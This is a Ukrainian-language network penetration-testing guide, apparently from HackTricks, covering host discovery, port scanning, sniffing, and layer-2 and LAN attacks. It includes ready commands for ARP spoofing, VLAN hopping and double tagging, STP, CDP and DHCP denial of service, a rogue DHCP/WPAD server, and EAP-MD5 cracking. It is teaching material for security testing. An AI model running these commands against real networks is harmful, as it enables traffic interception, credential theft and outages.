# Pentesting Мережа

{{#include ../../banners/hacktricks-training.md}}



## Виявлення hosts ззовні

Це буде **короткий розділ** про те, як знайти **IPs responding** з **Інтернету**.\
У цій ситуації у вас є певний **scope of IPs** (можливо навіть кілька **ranges**) і вам просто потрібно знайти **which IPs are responding**.

### ICMP

Це **найпростіший** і **найшвидший** спосіб дізнатися, чи host is up чи ні.\
Ви можете спробувати надіслати кілька **ICMP** пакетів і **очікувати відповіді**. Найпростіший варіант — просто відправити **echo request** і чекати відповіді. Ви можете зробити це, використовуючи простий `ping`or using `fping`for **ranges**.\
Ви також можете використовувати **nmap** для відправки інших типів ICMP пакетів (це допоможе уникнути фільтрів для звичних ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Дуже часто трапляється, що всі види ICMP packets фільтруються. Тоді єдиний спосіб перевірити, чи host is up — це **try to find open ports**. Кожен host має **65535 ports**, тому, якщо у вас «великий» scope, ви **cannot** перевірити, чи **each port** кожного host відкритий чи ні — це займе занадто багато часу.\
Отже, вам потрібен **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) і список **найпоширеніших ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Ви також можете виконати цей крок за допомогою `nmap`, але це повільніше, і `nmap` має певні проблеми з визначенням hosts up.

### Виявлення HTTP-портів

Це просто виявлення TCP-портів, корисне, коли ви хочете **зосередитися на виявленні HTTP** **сервісів**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Ви також можете спробувати перевірити, чи якийсь **UDP port open**, щоб вирішити, чи варто **pay more attention** до **host**. Оскільки UDP services зазвичай **don't respond** with **any data** to a regular empty UDP probe packet, важко сказати, чи порт фільтрується чи open. Найпростіший спосіб вирішити це — надіслати packet, пов'язаний із запущеним service, і оскільки ви не знаєте, який service запущено, слід спробувати найбільш ймовірний залежно від port number:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Рядок nmap, запропонований раніше, перевірить **top 1000 UDP ports** на кожному хості в межах **/24** діапазону, але навіть це займе **>20 хв**. Якщо потрібні **швидші результати**, можна використовувати [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Це надішле ці **UDP probes** на їхні **очікувані порти** (для /24 діапазону це займе лише 1 хв): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Виявлення SCTP портів
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Тут ви знайдете хороший посібник з усіх відомих Wifi-атак на момент написання:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Виявлення хостів зсередини

Якщо ви перебуваєте всередині мережі, одне з перших, що ви захочете зробити — це **виявити інші хости**. Залежно від того, **якої кількості шуму** ви можете/хочете створити, можуть бути виконані різні дії:

### Пасивно

Ви можете використовувати ці інструменти для пасивного виявлення хостів у підключеній мережі:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Активне

Зверніть увагу, що техніки, розглянуті в [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) також можна **застосувати тут**.\
Але, оскільки ви в **тій самій мережі** з іншими hosts, ви можете робити **більше**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Активний ICMP

Зауважте, що техніки, описані в _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)), також можна **застосувати тут**.\
Але, оскільки ви в **тій же мережі** що й інші hosts, ви можете зробити **більше**:

- Якщо ви **ping** на **subnet broadcast address**, ping має дійти до **each host** і вони можуть **respond** **to you**: `ping -b 10.10.5.255`
- Виконуючи **ping** на **network broadcast address**, ви навіть можете знайти hosts всередині **other subnets**: `ping -b 255.255.255.255`
- Використайте прапорці `-PE`, `-PP`, `-PM` у `nmap` для виконання host discovery, надсилаючи відповідно **ICMPv4 echo**, **timestamp**, та **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan використовується для **turn on** комп'ютерів через **network message**. The magic packet, що використовується для увімкнення комп'ютера, — це пакет, у якому задано **MAC Dst**, і який потім **repeated 16 times** всередині того ж paket.\
Зазвичай такі пакети надсилаються по **ethernet 0x0842** або в **UDP packet to port 9**.\
Якщо вказано **no \[MAC]**, пакет відправляється на **broadcast ethernet** (і broadcast MAC буде тим, що повторюється).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Сканування хостів

Після того як ви виявили всі IP-адреси (зовнішні або внутрішні), які хочете сканувати детально, можна виконати різні дії.

### TCP

- **Open** порт: _SYN --> SYN/ACK --> RST_
- **Closed** порт: _SYN --> RST/ACK_
- **Filtered** порт: _SYN --> \[НІ ВІДПОВІДІ]_
- **Filtered** порт: _SYN --> ICMP повідомлення_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Є 2 варіанти сканування UDP-порту:

- Надіслати **UDP packet** і перевірити відповідь _**ICMP unreachable**_, якщо порт **closed** (у деяких випадках ICMP буде **filtered**, тож ви не отримаєте інформації про те, чи порт **closed** чи **open**).
- Надіслати **formatted datagrams** щоб викликати відповідь від **service** (наприклад, DNS, DHCP, TFTP та інші, як перелічено в _nmap-payloads_). Якщо ви отримаєте **response**, то порт **open**.

**Nmap** буде **mix both** опції, використовуючи "-sV" (UDP scans are very slow), але зауважте, що UDP scans повільніші за TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** розроблений для використання разом з **TCP (Transmission Control Protocol)** та **UDP (User Datagram Protocol)**. Його основна мета — полегшити передачу телефонних даних по IP-мережах, відтворюючи багато функцій надійності, які присутні в **Signaling System 7 (SS7)**. **SCTP** є основним компонентом сімейства протоколів **SIGTRAN**, що має на меті транспортування сигналів SS7 по IP-мережах.

Підтримка **SCTP** реалізована в різних операційних системах, таких як **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, та **VxWorks**, що вказує на його широке визнання та корисність у сфері телекомунікацій та мереж.

Two different scans for SCTP are offered by nmap: _-sY_ and _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Обхід IDS та IPS


{{#ref}}
ids-evasion.md
{{#endref}}

### **Додаткові опції nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Виявлення внутрішніх IP-адрес

**Неправильно сконфігуровані маршрутизатори, firewalls та мережеві пристрої** іноді відповідають на мережеві probe-и, використовуючи **непублічні адреси джерела**. **tcpdump** можна використати для виявлення пакетів, отриманих з приватних адрес під час тестування. Зокрема, на Kali Linux пакети можна захоплювати на **eth2 інтерфейс**, який доступний з публічного Інтернету. Важливо зауважити, що якщо ваша конфігурація знаходиться за NAT або Firewall, такі пакети ймовірно будуть відфільтровані.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing дає змогу дізнатися деталі IP ranges, subnet sizes, MAC addresses та hostnames шляхом перегляду захоплених кадрів і пакетів. Якщо мережа некоректно налаштована або switching fabric знаходиться під навантаженням, нападники можуть отримати конфіденційну інформацію за допомогою passive network sniffing.

Якщо комутована Ethernet-мережа налаштована правильно, ви бачитимете лише broadcast frames та трафік, призначений для вашої MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Також можна захоплювати пакети з віддаленої машини через SSH-сеанс, використовуючи Wireshark як GUI в реальному часі.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Очевидно.

### Capturing credentials

Ви можете використовувати інструменти на кшталт [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) для парсингу облікових даних з pcap-файлу або з живого інтерфейсу.

## Атаки в LAN

### ARP spoofing

ARP Spoofing полягає в надсиланні gratuitous ARPResponses, щоб вказати, що IP машини має MAC нашого пристрою. Тоді жертва змінить ARP-таблицю і звертатиметься до нашої машини щоразу, коли захоче зв'язатися з підробленою IP-адресою.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Переповніть CAM table комутатора, відправляючи багато пакетів з різними source mac address. Коли CAM table заповниться, комутатор починає поводитися як hub (транслюючи весь трафік).
```bash
macof -i <interface>
```
У сучасних комутаторах ця вразливість була виправлена.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** призначений як протокол канального рівня для реалізації автоматичної системи trunking, що дозволяє комутаторам автоматично обирати порти для режиму Trunk або для не-trunk режиму. Використання **DTP** часто сприймається як ознака неоптимальної архітектури мережі, що підкреслює важливість ручного налаштування trunk'ів лише там, де це необхідно, та належної документації.

За замовчуванням порти комутатора налаштовані на роботу в режимі Dynamic Auto, тобто вони готові ініціювати trunking, якщо це попросить сусідній комутатор. Проблема безпеки виникає, коли pentester або attacker підключається до комутатора і надсилає DTP Desirable frame, змушуючи порт перейти в режим trunk. Це дає attacker змогу перераховувати VLANs через аналіз STP frame і обходити сегментацію VLAN, створюючи virtual interfaces.

Наявність DTP за замовчуванням у багатьох комутаторах може бути використана зловмисниками для імітації поведінки комутатора і, таким чином, отримання доступу до трафіку на всіх VLANs. Скрипт [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) використовується для моніторингу інтерфейсу і показує, чи знаходиться комутатор у режимі Default, Trunk, Dynamic, Auto або Access — останній є єдиною конфігурацією, стійкою до VLAN hopping атак. Цей інструмент оцінює стан вразливості комутатора.

Якщо в мережі виявлено вразливість, можна використати інструмент _**Yersinia**_ для "enable trunking" через протокол DTP, що дозволить спостерігати пакети з усіх VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Щоб перелічити VLANs, також можна згенерувати DTP Desirable frame за допомогою скрипта [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Н**е переривайте скрипт за жодних обставин. Він інжектує DTP Desirable кожні три секунди. **Динамічно створені trunk channels на switch існують лише п'ять хвилин. Через п'ять хвилин trunk відпадає.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Я хочу зазначити, що **Access/Desirable (0x03)** вказує, що DTP-кадр має тип Desirable, який змушує порт перейти в режим Trunk. А **802.1Q/802.1Q (0xa5** вказує тип інкапсуляції **802.1Q**.

Аналізуючи STP-кадри, **ми дізнаємося про наявність VLAN 30 та VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attacking specific VLANs

Коли ви знаєте VLAN IDs та IP-адреси, ви можете **configure a virtual interface to attack a specific VLAN**.\
Якщо DHCP недоступний, використовуйте _ifconfig_ для налаштування статичної IP-адреси.

<details>
<summary>Налаштування інтерфейсу VLAN (приклад)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Описувана атака **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** в інших VLANах **автоматично виконується** інструментом: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Якщо атакуючий знає значення **MAC, IP and VLAN ID of the victim host**, він може спробувати **double tag a frame** зі своєю призначеною VLAN та VLAN цілі й відправити пакет. Оскільки **victim won't be able to connect back** з атакуючим, **найкращим варіантом для атакуючого є communicate via UDP** з протоколами, які можуть виконувати корисні дії (як-от SNMP).

Ще одна опція для атакуючого — запустити **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (ймовірно через інтернет). Потім атакуючий може sniff на другому хості, яким він володіє, щоб перевірити, чи отримає він пакети від жертви.

![](<../../images/image (190).png>)

Щоб виконати цю атаку, можна використати scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

If you have **доступ до switch, до якого ви підключені безпосередньо**, ви маєте змогу **bypass VLAN segmentation** всередині мережі. Просто **переведіть порт у trunk mode** (також відомий як trunk), створіть virtual interfaces з IDs цільових VLAN і налаштуйте IP address. Ви можете спробувати отримати адресу динамічно (DHCP) або налаштувати її статично. Залежить від випадку.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

У певних середовищах, таких як guest wireless networks, впроваджуються налаштування **port isolation (also known as private VLAN)**, щоб запобігти прямому спілкуванню клієнтів, підключених до wireless access point. Проте існує техніка, яка може обійти ці заходи ізоляції. Ця техніка експлуатує або відсутність network ACLs, або їх неправильну конфігурацію, дозволяючи IP packets маршрутизуватися через router, щоб досягти іншого клієнта в тій же мережі.

Атака виконується шляхом створення **packet, що несе IP address цільового клієнта, але з MAC address router'а**. Це змушує router помилково переслати пакет до цільового клієнта. Цей підхід схожий на той, що використовується в Double Tagging Attacks, де можливість контролювати хост, доступний жертві, використовується для експлуатації вразливості.

**Ключові кроки атаки:**

1. **Формування пакета:** Пакет спеціально створюється так, щоб містити IP address цільового клієнта, але з MAC address router'а.
2. **Експлуатація поведінки router'а:** Сформований пакет відправляється в напрямку router'а, який через конфігурацію перенаправляє пакет до цільового клієнта, обходячи ізоляцію, що забезпечується private VLAN налаштуваннями.

### VTP Attacks

VTP (VLAN Trunking Protocol) централізує управління VLAN. Він використовує revision numbers для підтримки цілісності VLAN database; будь-яка модифікація збільшує це число. Switches приймають конфігурації з вищими revision numbers, оновлюючи власні VLAN databases.

#### VTP Domain Roles

- **VTP Server:** Керує VLAN — створює, видаляє, модифікує. Він розсилає VTP announcements членам домену.
- **VTP Client:** Отримує VTP announcements для синхронізації свого VLAN database. Ця роль обмежує можливість локально змінювати конфігурацію VLAN.
- **VTP Transparent:** Не бере участі в VTP updates, але пересилає VTP announcements. Не піддається VTP attacks, підтримує постійний revision number рівний нулю.

#### VTP Advertisement Types

- **Summary Advertisement:** Розсилається VTP server кожні 300 секунд, несе основну інформацію про домен.
- **Subset Advertisement:** Відправляється після змін у VLAN configuration.
- **Advertisement Request:** Видається VTP client для запиту Summary Advertisement, зазвичай у відповідь на виявлення вищого configuration revision number.

VTP vulnerabilities можуть бути експлуатовані виключно через trunk ports, оскільки VTP announcements поширюються лише ними. Після DTP attack сценарії можуть переключатися на VTP. Інструменти на кшталт Yersinia можуть полегшити VTP attacks, метою яких є очищення VLAN database, що ефективно порушує роботу мережі.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
У графічному режимі Yersinia виберіть опцію deleting all VTP vlans, щоб очистити базу даних VLAN.

### STP Атаки

**Якщо ви не можете захопити кадри BPDU на ваших інтерфейсах, навряд чи вам вдасться успішно здійснити атаку STP.**

#### **STP BPDU DoS**

Надсилаючи велику кількість BPDUs TCP (Topology Change Notification) або Conf (BPDUs, що надсилаються при створенні топології), комутатори перевантажуються і перестають працювати коректно.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Коли надсилається TCP, CAM table of the switches буде видалена через 15s. Потім, якщо ви постійно надсилаєте такі packets, CAM table буде перезапускатися постійно (або кожні 15segs), і коли воно перезапускається, switch поводиться як hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Зловмисник імітує поведінку switch, щоб стати STP root у мережі. Потім через нього проходитиме більше трафіку. Це цікаво, коли ви підключені до двох різних switches.\
Цього досягають шляхом відправлення пакетів BPDUs CONF, які повідомляють, що значення **priority** менше, ніж фактичне priority поточного root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Якщо attacker підключений до 2 switches, він може стати root нового tree, і весь трафік між цими switches проходитиме через нього** (буде виконано MITM attack).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Атаки

CISCO Discovery Protocol (CDP) є важливим для зв'язку між пристроями CISCO, дозволяючи їм **взаємно ідентифікуватися та обмінюватися деталями конфігурації**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP налаштований на трансляцію інформації через усі порти, що може створювати ризик безпеки. Зловмисник, підключившись до порту комутатора, може розгорнути network sniffers на кшталт **Wireshark**, **tcpdump**, або **Yersinia**. Ця дія може розкрити конфіденційну інформацію про мережевий пристрій, включно з його моделлю та версією Cisco IOS, на якій він працює. Зловмисник може потім націлити конкретні вразливості в ідентифікованій версії Cisco IOS.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Більш агресивний підхід полягає у запуску Denial of Service (DoS) атаки шляхом переповнення пам'яті комутатора, видаючи себе за легітимні пристрої CISCO. Нижче наведено послідовність команд для ініціювання такої атаки з використанням Yersinia, мережевого інструменту, призначеного для тестування:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Під час цієї атаки CPU комутатора та таблиця сусідів CDP зазнають значного навантаження, що часто призводить до **“паралічу мережі”** через надмірне споживання ресурсів.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Атаки VoIP та інструмент VoIP Hopper

VoIP-телефони, що дедалі частіше інтегруються з IoT-пристроями, пропонують функції, як-от відкривання дверей або керування термостатами через спеціальні телефонні номери. Однак така інтеграція може створювати ризики безпеки.

Інструмент [**voiphopper**](http://voiphopper.sourceforge.net) призначений для емуляції VoIP-телефона в різних середовищах (Cisco, Avaya, Nortel, Alcatel-Lucent). Він визначає VLAN ID голосової мережі, використовуючи протоколи, такі як CDP, DHCP, LLDP-MED та 802.1Q ARP.

**VoIP Hopper** пропонує три режими для Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Аналізує мережеві пакети, щоб визначити VLAN ID.
2. **Spoof Mode** (`-c 1`): Генерує користувацькі пакети, що імітують пакети реального VoIP-пристрою.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Надсилає пакети, ідентичні тим, що генерує конкретна модель Cisco IP phone.

Переважним режимом з точки зору швидкості є третій. Він вимагає вказати:

- Мережевий інтерфейс атакуючого (`-i` параметр).
- Назву VoIP-пристрою, що емуляється (`-E` параметр), у форматі іменування Cisco (наприклад, SEP, за яким слідує MAC-адреса).

У корпоративному середовищі, щоб імітувати існуючий VoIP-пристрій, можна:

- Перевірити MAC-наклейку на телефоні.
- Перейти до налаштувань дисплея телефону, щоб переглянути інформацію про модель.
- Підключити VoIP-пристрій до ноутбука та спостерігати CDP-запити за допомогою Wireshark.

Приклад команди для запуску інструмента в третьому режимі виглядає так:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Два типи DoS** можуть бути виконані проти DHCP серверів. Перший полягає у **симуляції достатньої кількості фейкових хостів, щоб зайняти всі можливі IP-адреси**.\
Ця атака працюватиме тільки якщо ви можете бачити відповіді DHCP сервера та завершити протокол (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Наприклад, це **неможливо в Wifi мережах**.

Інший спосіб виконати DHCP DoS — відправити **DHCP-RELEASE packet, використовуючи як вихідну адресу кожну можливу IP-адресу**. Тоді сервер подумає, що всі припинили використовувати ці IP-адреси.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **ви можете надати шкідливі значення, згадані в наступній атаці**.

#### Встановлення шкідливих значень

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. Це корисно для мережевих атак, наприклад перехоплення HTTP-трафіку та облікових даних, шляхом перенаправлення трафіку на шкідливий сервер. Проте встановлення шкідливого шлюзу менш ефективне, оскільки воно дозволяє лише перехоплювати вихідний трафік від клієнта та пропускає відповіді від реального шлюзу. Натомість рекомендується налаштувати шкідливий DNS або WPAD-сервер для ефективнішої атаки.

Нижче наведено опції команд для налаштування шкідливого DHCP-сервера:

- **Наша IP-адреса (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Локальний DNS-домен**: Опційно використайте `-d example.org`, щоб задати локальний DNS-домен.
- **IP оригінального маршрутизатора/шлюзу**: Використайте `-r 10.0.0.1`, щоб вказати IP легітимного маршрутизатора або шлюзу.
- **IP основного DNS-сервера**: Використайте `-p 10.0.0.100`, щоб встановити IP шкідливого DNS-сервера, яким ви керуєте.
- **IP вторинного DNS-сервера**: Опційно використайте `-s 10.0.0.1`, щоб задати IP вторинного DNS-сервера.
- **Маска підмережі локальної мережі**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Інтерфейс для DHCP-трафіку**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **Адреса конфігурації WPAD**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Підробити IP шлюзу за замовчуванням**: Include `-S` to spoof the default gateway IP address.
- **Відповідати на всі DHCP-запити**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

Правильне використання цих опцій дозволяє створити шкідливий DHCP-сервер для ефективного перехоплення мережевого трафіку.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP атаки**

Ось деякі тактики атак, які можуть бути використані проти реалізацій 802.1X:

- Активне brute-force підбирання пароля через EAP
- Атака на RADIUS сервер за допомогою некоректного EAP вмісту _\*\*_(exploits)
- Перехоплення EAP-повідомлень та офлайн-злам паролів (EAP-MD5 і PEAP)
- Примусове використання EAP-MD5 для обходу перевірки TLS сертифікатів
- Інжекція шкідливого мережевого трафіку після аутентифікації з використанням hub або подібного

Якщо зловмисник знаходиться між жертвою та сервером аутентифікації, він може спробувати знизити (за потреби) протокол аутентифікації до EAP-MD5 та перехопити спробу аутентифікації. Потім він може brute-force це, використовуючи:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) — це клас мережевих протоколів, призначених для створення **гарячої резервної системи маршрутизації**. Завдяки FHRP фізичні маршрутизатори можуть бути об’єднані в один логічний пристрій, що підвищує відмовостійкість і допомагає розподіляти навантаження.

**Інженери Cisco Systems розробили два протоколи FHRP — GLBP та HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Існує три відомі версії Routing Information Protocol: RIP, RIPv2 та RIPng. Datagram-и відправляються до peers через порт 520 з використанням UDP у RIP та RIPv2, тоді як у RIPng datagram-и транслюються на UDP порт 521 через IPv6 multicast. Підтримка MD5 authentication була введена в RIPv2. Натомість у RIPng немає вбудованої автентифікації — він покладається на опціональні заголовки IPsec AH та ESP в IPv6.

- **RIP and RIPv2:** Зв’язок здійснюється через UDP datagram-и на порті 520.
- **RIPng:** Використовує UDP порт 521 для трансляції datagram-ів через IPv6 multicast.

